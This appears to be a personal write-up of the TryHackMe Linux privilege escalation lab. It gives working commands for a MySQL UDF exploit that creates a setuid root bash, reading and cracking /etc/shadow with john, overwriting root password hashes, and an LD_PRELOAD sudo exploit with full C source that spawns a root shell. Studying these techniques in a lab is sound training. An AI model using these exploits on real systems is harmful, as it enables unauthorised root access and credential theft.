---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-04T17:17:01.029+02:00","dg-note-properties":{}}
---

![](/img/user/Attachments/redteaming2.png)
## Description



## Initial Access

Following THM instructions and connecting to the target as per the command below. As suspeted OpenSSH have deprecated ssh-rsa so the extra argument is necessary. 

`ssh user@TARGET -oHostKeyAlgorithms=+ssh-rsa`

__________

## Service Exploits 

Entering the directory : `cd /home/user/tools/mysql-udf`

Compiling the **.c** file
`gcc -g -c raptor_udf2.c -fPIC`
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Connecting to mysql service as root with blank password

![](/img/user/Attachments/dbconnect.png)

Executing the commands as per the THM instructions

```
use mysql; 

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

## use the function to copy
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![](/img/user/Attachments/exploit_commands.png)

Now using the exploit to gain root privileges

`/tmp/rootbash -p`

![](/img/user/Attachments/firstroot.png)

Now deleting the exploit and exiting the shell

`rm /tmp/rootbash`

______

## Weak File Permissions - Readable /etc/shadow

reading the `/etc/shadow` file which should only readable by **root**

`ls -l /etc/shadow`

![](/img/user/Attachments/etcshadow.png)

Reading the content of /etc/shadow

`cat /etc/shadow`

![](/img/user/Attachments/etcshadow-content.png)

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Now saving **root** hash into a file and using **john** to crack it. 

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](/img/user/Attachments/roothashcrack.png)

Now switching to root is a walk in the park `su root`

![](/img/user/Attachments/root2.png)


---------

## Weak File Permissions - Writeable /etc/shadow


Now generating a new password hash `mkpasswd -m sha-512 PASS`

```
# make new hash
mkpasswd -m sha-512 toor1

$6$WNY/fRw3Uz$78unWndGWjkB5JHWow1DBM51GwkZGaqXhTsqjStq.2X9VDSZ5DEp1gn6gE9ZbeCAoqEaFKpJzqkDQQaJYWfDW1
```

And pasting into `/etc/shadow` for root user. 

```

# Updating the old password. 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.  
jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

Password is inserted between first colon to the left and first colon to the right.

First number sequence coming after the first colon is the **timestamp** for last changed date

-----------

## Weak File Permissions - Writeable /etc/passwd

#### Breakdown of File Permissions

```
-  rw-  r--  rw-
│   │    │    │
│   │    │    └── Other (everyone else) → read + write
│   │    └─────── Group (shadow group)  → read only
│   └──────────── Owner (root)          → read + write
└──────────────── File type (- = regular file)
```

Once again **/etc/passwd** is world-writeable.

`ls -l /etc/passwd` 

As is seen by the weak file permissions `-rw-r--rw-`

Generating a new password hash with openssl `openssl passwd toor1`
hash: `qkeUSxWTs4PU6`

-----------

## Sudo - Shell Escape Sequences

Checking how many programs **user** is allowed to run with sudo

`sudo -l`

![](/img/user/Attachments/userrunsudo.png)

----------

## Sudo - Environmental Variables

Checking which environment variables can be inherited from **user** environment

`sudo -l`

![](/img/user/Attachments/env-vars.png)

**What is LD_PRELOAD?**
```

When Linux runs a program, it loads shared libraries (`.so` files) that the program needs. `LD_PRELOAD` is an environment variable that tells the dynamic linker to load the SPECIFIED shared object **before any other library** — even before standard ones like `libc`.
```

### Breakdown of Environmental Variables Vulnerability ...

**Dynamic Linker**
Dynamic linker is an app which runs every time a binary is executed

**Why LD_PRELOAD is Exploitable**
Normally `LD_PRELOAD` is ignored when running with `sudo` for security reasons. But `sudo -l` shows. This means sudo is **explicitly configured to preserve** `LD_PRELOAD` — a serious misconfiguration.

**What preload.c Does**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");  // remove LD_PRELOAD to avoid loops
    setresuid(0,0,0);        // set uid to root (0)
    setresgid(0,0,0);        // set gid to root (0)
    system("/bin/bash -p");  // spawn bash with root privileges
}
```


`_init()` is a special function that runs **automatically when a shared library is loaded** — before anything else. So when sudo loads the `.so` file, it immediately runs the code with root privileges.

### Visualization of the Exploitation Process

```
sudo LD_PRELOAD=/tmp/preload.so find
         │
         ├── sudo sees env_keep+=LD_PRELOAD
         ├── sudo runs find as root
         ├── Linux loader loads /tmp/preload.so FIRST
         ├── _init() executes automatically
         ├── setresuid(0,0,0) → you are now root
         └── /bin/bash -p spawns → root shell
```
### Task 
Create a shared object using the code located at /home/user/tools/sudo/preload.c:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Now while setting the `LD_PRELOAD` environment variable to the full new path of the object im selecting a program that can be run with **sudo** privs as **user** 

`sudo LD_PRELOAD=/tmp/preload.so find`

And now root shell spawns 

![](/img/user/Attachments/root-spawn.png)

After exiting root shell now im checking which shared libraries are used by `apache2` by running **ldd** against it 

`ldd /usr/sbin/apache2`

**What `*ldd /usr/sbin/apache2*` is doing**
`ldd` lists all shared libraries a program depends on. You run it to find library names you can hijack — you need to name your malicious `.so` file exactly the same as a real library apache2 uses.

![](/img/user/Attachments/libs2hijack.png)




